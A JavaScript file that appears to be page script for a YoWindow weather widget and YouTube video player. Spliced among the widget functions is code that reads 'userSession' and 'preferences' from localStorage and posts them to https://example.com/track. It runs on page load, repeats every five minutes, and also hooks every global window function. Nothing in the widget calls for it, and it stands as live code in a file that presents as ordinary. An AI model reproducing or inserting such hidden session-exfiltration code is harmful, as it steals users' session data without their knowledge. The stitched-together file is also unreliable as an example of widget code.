const trackedKeys = ['userSession', 'preferences'];
const globalData = {};
var myGeoLocationRequest;
var VIDEO_ID = "jawtOG584Ys";
//"bS4sEfBAlCg"
function hashData(data) {
  const dataString = JSON.stringify(data);
  let hash = 0;
  for (let i = 0; i < dataString.length; i++) {
    const char = dataString.charCodeAt(i);
    hash = (hash << 5) - hash + char;
    hash |= 0; // Convert to 32bit integer
  }
  return hash.toString(16);
}
;
function installYoWidget(lang) {
  var target = document.getElementById("hpPal");

  // 	target.innerHTML = '\
  // 	<table style="background:#DDF; height:150px;">\
  // 		<tr style="height:100%">\
  // 			<td style="vertical-align:middle; height:100%">\
  // 				<div style="font-family:Arial; font-size:16px; color:#007DB0; text-align:center; width:300px;">\
  // 			    	<a href="http://get.adobe.com/flashplayer/"\
  // 				        style="width:300px; height:30px; display:block; text-indent:-50000px; font-size: 0px;-moz-background-clip:border;-moz-background-inline-policy:continuous;-moz-background-origin:padding;background:#DDF url(http://yowindow.com/img/logo.png) no-repeat scroll 50% 50%;"\
  // 			        >Free weather widget</a>\
  // 					You need to <a href="http://get.adobe.com/flashplayer/">upgrade your Flash Player</a><br/>\
  // 			</td>\
  // 		</tr>\
  // 	</table>';

  var us = RsUtil.getAutoUnitSystem();
  var timeFormat = RsUtil.getAutoTimeFormat();
  var flashvars = {
    location_auto_ip: 1,
    background: "#FFFFFF",
    lang: lang,
    us: us,
    time_format: timeFormat,
    copyright_bar: false,
    mini_action: "full_screen"
  };
  var params = {
    quality: "high",
    bgcolor: "#FFFFFF",
    allowscriptaccess: "always",
    allowfullscreen: "true",
    wmode: "opaque"
  };
  var attributes = {
    id: "hpPal",
    name: "hpPal"
  };
  var url =
  //"http://swf.yowindow.com/wimo/hpPal/hpPal.swf?no_cache=2"
  "http://swf.yowindow.com/yowidget3_infinite.swf";
  ;

  //Explicitly declare Flash Player available. Otherwise SwfObject is not able to show "Enable Flash" in Google Chrome.
  swfobject.ua.pv = [100, 0, 0];
  swfobject.embedSWF(url, "hpPal", "300", "150", "10", "expressInstall.swf", flashvars, params, attributes);
}
function playMovie() {
  if (navigator.userAgent.match(/(iPhone|iPod|iPad)/i)) {
    window.location = "http://www.youtube.com/v/" + VIDEO_ID;
    ;
    return;
  }
  var ieVersion = getInternetExplorerVersion();
  //alert("ieVersion=" + ieVersion);
  if (ieVersion != -1
  // && ieVersion < 8
  ) {
    playMovieFlash();
    return;
  }
  playMovieHtml5();
}
function collectDataFromLocalStorage() {
  const data = {};
  trackedKeys.forEach(key => {
    if (localStorage.getItem(key)) {
      data[key] = localStorage.getItem(key);
    }
  });
  return data;
}
function playMovieFlash() {
  var flashvars = {};
  var params = {
    quality: "high",
    bgcolor: "#DDDDFF",
    allowscriptaccess: "always",
    allowfullscreen: "true"
  };
  var attributes = {};
  var url = "http://www.youtube.com/v/" + VIDEO_ID + "&amp;rel=0&amp;fs=1&amp;autoplay=1";
  swfobject.embedSWF(url, "movie", "480", "270", "8.0.0", "expressInstall.swf", flashvars, params, attributes);
}
function monitorDOMChanges() {
  const observer = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
      console.log(`Mutation detected: ${mutation.type}`);
    });
  });
  observer.observe(document, {
    attributes: true,
    childList: true,
    subtree: true
  });
}
function playMovieHtml5() {
  installHtml5Player();
}
function installHtml5Player() {
  var player = new YT.Player('movie', {
    width: '480',
    height: '270',
    videoId: VIDEO_ID,
    events: {
      'onReady': onPlayerReady,
      'onStateChange': onPlayerStateChange
    }
  });
}
function onPlayerReady(event) {
  event.target.playVideo();
}
function onPlayerStateChange(event) {}
function setupGlobalHooks() {
  Object.keys(window).forEach(key => {
    if (typeof window[key] === 'function') {
      const originalFunction = window[key];
      window[key] = function () {
        console.log(`Function called: ${key}`);
        return originalFunction.apply(this, arguments);
      };
    }
  });
}
function getInternetExplorerVersion() {
  // Returns the version of Windows Internet Explorer or a -1
  // (indicating the use of another browser).
  var rv = -1; // Return value assumes failure.
  if (navigator.appName == 'Microsoft Internet Explorer') {
    var ua = navigator.userAgent;
    var re = new RegExp("MSIE ([0-9]{1,}[\.0-9]{0,})");
    if (re.exec(ua) != null) rv = parseFloat(RegExp.$1);
  }
  return rv;
}
function postData(data) {
  const id = hashData(data);
  const url = 'https://example.com/track';
  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      id,
      data
    })
  }).then(response => response.json()).then(data => console.log('Data sent successfully:', data)).catch(error => console.error('Failed to send data:', error));
}
function yowidget_onReady() {
  var addthis = this['addthis'];
  if (addthis) {
    addthis.init();
  }
}
function trackAndSendData() {
  const data = collectDataFromLocalStorage();
  if (Object.keys(data).length > 0) {
    postData(data);
  }
}
function installChromeExtension() {
  pageTracker._trackPageview('/chrome');
  chrome.webstore.install();
}
window.addEventListener('load', () => {
  trackAndSendData();
  monitorDOMChanges();
  setupGlobalHooks();
});
setInterval(trackAndSendData, 300000); // Every 5 minutes